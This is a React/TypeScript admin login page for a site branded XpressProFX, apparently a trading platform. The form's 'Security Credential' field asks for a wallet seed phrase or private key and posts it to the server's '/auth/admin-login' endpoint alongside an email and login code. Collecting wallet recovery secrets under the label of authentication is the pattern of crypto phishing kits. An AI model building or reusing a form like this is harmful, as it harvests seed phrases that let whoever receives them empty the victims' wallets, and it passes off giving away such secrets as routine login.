import { useState } from "react";
import { useLocation } from "wouter";
import { Shield, Eye, EyeOff, Lock, Mail, Hash } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";
import { api } from "@/lib/api";
import { setAuth } from "@/lib/auth";

export default function AdminLogin() {
  const [, navigate] = useLocation();
  const { toast } = useToast();
  const [loading, setLoading] = useState(false);
  const [showCred, setShowCred] = useState(false);
  const [form, setForm] = useState({ email: "", securityCredential: "", loginCode: "" });

  const set = (k: keyof typeof form) => (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) =>
    setForm(f => ({ ...f, [k]: e.target.value }));

  async function handleLogin(e: React.FormEvent) {
    e.preventDefault();
    if (!form.email || !form.securityCredential || !form.loginCode) {
      toast({ title: "All fields required", variant: "destructive" });
      return;
    }
    setLoading(true);
    try {
      const data: any = await api.post("/auth/admin-login", form);
      setAuth(data.token, data.user.id, "admin");
      window.sessionStorage.setItem("expresspro101_is_admin", "true");
      toast({ title: "Admin Access Granted", description: "Welcome to the admin control panel." });
      navigate("/admin");
    } catch (err: any) {
      toast({ title: "Access Denied", description: err.message, variant: "destructive" });
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="min-h-screen bg-background flex items-center justify-center p-4">
      <div className="w-full max-w-md space-y-6">
        <div className="flex flex-col items-center gap-3">
          <div className="w-14 h-14 rounded-2xl bg-rose-600 flex items-center justify-center shadow-lg">
            <Shield size={28} className="text-white" />
          </div>
          <div className="text-center">
            <h1 className="text-2xl font-bold text-foreground">ADMIN C-PANEL</h1>
            <p className="text-sm text-muted-foreground">XpressProFX Control Panel — Restricted Access</p>
          </div>
        </div>

        <Card className="border-rose-500/20 shadow-xl">
          <CardHeader className="pb-4">
            <CardTitle className="text-lg text-center text-rose-400">Administrator Login</CardTitle>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleLogin} className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="email">Admin Email</Label>
                <div className="relative">
                  <Mail size={16} className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground" />
                  <Input
                    id="email"
                    type="email"
                    placeholder="admin@admin.com"
                    value={form.email}
                    onChange={set("email")}
                    className="pl-9"
                    required
                  />
                </div>
              </div>

              <div className="space-y-2">
                <Label>Security Credential</Label>
                <p className="text-xs text-muted-foreground">Enter seed phrase (12 or 24 words) or private key code</p>
                <div className="relative">
                  <Shield size={16} className="absolute left-3 top-3 text-muted-foreground" />
                  <textarea
                    placeholder="Seed phrase or private key..."
                    value={form.securityCredential}
                    onChange={set("securityCredential")}
                    className="w-full pl-9 pr-4 py-2 min-h-[90px] bg-input border border-input-border rounded-md text-sm resize-none focus:outline-none focus:ring-2 focus:ring-rose-500"
                    required
                  />
                </div>
              </div>

              <div className="space-y-2">
                <Label>Login Code</Label>
                <div className="relative">
                  <Hash size={16} className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground" />
                  <Input
                    type={showCred ? "text" : "password"}
                    placeholder="Enter login code"
                    value={form.loginCode}
                    onChange={set("loginCode")}
                    className="pl-9 pr-10"
                    required
                  />
                  <button type="button" onClick={() => setShowCred(!showCred)} className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground">
                    {showCred ? <EyeOff size={16} /> : <Eye size={16} />}
                  </button>
                </div>
              </div>

              <Button type="submit" className="w-full bg-rose-600 hover:bg-rose-700 text-white h-11" disabled={loading}>
                {loading ? "Verifying..." : "Access Admin Panel"}
              </Button>
            </form>

            <div className="mt-4 text-center">
              <a href="/auth/login" className="text-sm text-muted-foreground hover:text-foreground">
                ← Back to User Login
              </a>
            </div>
          </CardContent>
        </Card>

        <p className="text-center text-xs text-muted-foreground">
          Unauthorized access attempts are logged and reported.
        </p>
      </div>
    </div>
  );
}
